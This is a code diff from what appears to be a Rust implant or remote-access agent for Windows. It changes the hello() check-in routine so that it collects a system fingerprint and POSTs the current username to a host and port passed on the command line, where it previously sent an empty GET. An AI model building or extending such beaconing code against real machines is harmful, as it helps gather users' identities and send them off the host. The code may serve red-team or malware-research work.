@@ -1,13 +1,15 @@
 mod collector;
 mod comms;
 
+use std::collections::HashMap;
+
 use collector::SystemFingerprint;
 use comms::Communicator;
 use comms::client::Request;
 use windows::core::{Error, Result};
 
 pub fn hello() -> Result<()> {
-    let _fingerprint = SystemFingerprint::collect()?;
+    let fingerprint = SystemFingerprint::collect()?;
     let mut comm = Communicator::new()?;
 
     let args = std::env::args()
@@ -18,7 +20,16 @@ pub fn hello() -> Result<()> {
     let hostname = home[0];
     let port: u16 = home[1].parse().unwrap();
 
-    let request = Request::new(hostname, port, "GET", "/", None, None);
+    let mut headers: HashMap<String, String> = HashMap::new();
+    headers.insert("Content-Type".to_string(), "text/plain".to_string());
+
+    let body = fingerprint
+        .user
+        .username
+        .unwrap_or("Unknown username".to_string());
+    let body = body.as_str();
+
+    let request = Request::new(hostname, port, "POST", "/hi", Some(headers), Some(body));
 
     let response = comm.request(request)?;
 
